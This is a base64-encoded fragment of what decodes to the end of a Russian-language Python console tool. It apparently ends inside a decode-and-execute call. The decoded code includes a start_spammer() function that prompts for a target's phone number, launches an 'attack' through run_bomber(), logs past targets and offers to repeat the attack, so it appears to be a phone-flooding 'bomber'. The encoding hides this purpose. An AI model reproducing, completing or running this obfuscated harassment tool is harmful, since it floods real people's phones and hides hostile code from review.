Rg9GCLiIpCiAgICAgICAgICAgICAgICBpbnB1dCgiXG7QndCw0LbQvNC40YLQtSBFbnRlciDRh9GC0L7QsdGLINCy0LXRgNC90YPRgtGM0YHRjy4uLiIpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBzaG93X2hpc3RvcnkoKQogICAgICAgIGVsaWYgY2hvaWNlID09ICIzIjoKICAgICAgICAgICAgIyBUT0RPOiDQtNC+0LHQsNCy0LjRgtGMINC80LXQvdGOINC90LDRgdGC0YDQvtC10LoKICAgICAgICAgICAgcHJpbnQoIlxuWyFdINCSINGA0LDQt9GA0LDQsdC+0YLQutC1IikKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGVsaWYgY2hvaWNlID09ICIwIjoKICAgICAgICAgICAgcHJpbnQoIlxuWytdINCf0YDQvtCz0YDQsNC80LzQsCDQt9Cw0LLQtdGA0YjQtdC90LAuIikKICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgiXG5bIV0g0J3QtdCy0LXRgNC90YvQuSDQstGL0LHQvtGAISIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKCgpkZWYgc3RhcnRfc3BhbW1lcigpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIHByaW50KHNob3dfYmFubmVyKCkpCgogICAgcHJpbnQoIlxuPT09INCX0LDQv9GD0YHQuiDQsNGC0LDQutC4ID09PVxuIikKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHBob25lX2lucHV0ID0gaW5wdXQoItCS0LLQtdC00LjRgtC1INC90L7QvNC10YAg0YLQtdC70LXRhNC+0L3QsCAoKzdYWFhYWFhYWFhYKTogIikKCiAgICAgICAgaWYgcGhvbmVfaW5wdXQubG93ZXIoKSBpbiBbInEiLCAiZXhpdCIsICJxdWl0IiwgIjAiXToKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIHBob25lID0gdmFsaWRhdGVfcGhvbmUocGhvbmVfaW5wdXQpCgogICAgICAgIGlmIHBob25lOgogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJbIV0g0J3QtdC60L7RgNGA0LXQutGC0L3Ri9C5INGE0L7RgNC80LDRgiDQvdC+0LzQtdGA0LAhINCf0L7Qv9GA0L7QsdGD0LnRgtC1INGB0L3QvtCy0LAg0LjQu9C4INCy0LLQtdC00LjRgtC1ICdxJyDQtNC70Y8g0LLRi9GF0L7QtNCwLiIpCgogICAgc3VjY2Vzc19jb3VudCA9IHJ1bl9ib21iZXIocGhvbmUpCgogICAgc2F2ZV9oaXN0b3J5KHBob25lLCBzdWNjZXNzX2NvdW50KQoKICAgIHByaW50KCJcbtCn0YLQviDQtNCw0LvRjNGI0LU/IikKICAgIHByaW50KCIxLiDQl9Cw0L/Rg9GB0YLQuNGC0Ywg0YHQvdC+0LLQsCDRgSDRgtC10Lwg0LbQtSDQvdC+0LzQtdGA0L7QvCIpCiAgICBwcmludCgiMi4g0JLQstC10YHRgtC4INC00YDRg9Cz0L7QuSDQvdC+0LzQtdGAIikKICAgIHByaW50KCIzLiDQktC10YDQvdGD0YLRjNGB0Y8g0LIg0LPQu9Cw0LLQvdC+0LUg0LzQtdC90Y4iKQoKICAgIGNob2ljZSA9IGlucHV0KCJcbtCS0YvQsdC10YDQuNGC0LUg0L7Qv9GG0LjRjjogIikKCiAgICBpZiBjaG9pY2UgPT0gIjEiOgogICAgICAgIHJ1bl9ib21iZXIocGhvbmUpCiAgICBlbGlmIGNob2ljZSA9PSAiMiI6CiAgICAgICAgc3RhcnRfc3BhbW1lcigpCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHRyeToKICAgICAgICBtYWluX21lbnUoKQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgIHByaW50KCJcblshXSDQn9GA0L7Qs9GA0LDQvNC80LAg0LfQsNCy0LXRgNGI0LXQvdCwINC/0L7Qu9GM0LfQvtCy0LDRgtC10LvQtdC8LiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJcblshXSDQmtGA0LjRgtC40YfQtdGB0LrQsNGPINC+0YjQuNCx0LrQsDoge3N0cihlKX0iKQo=').decode('utf-8'))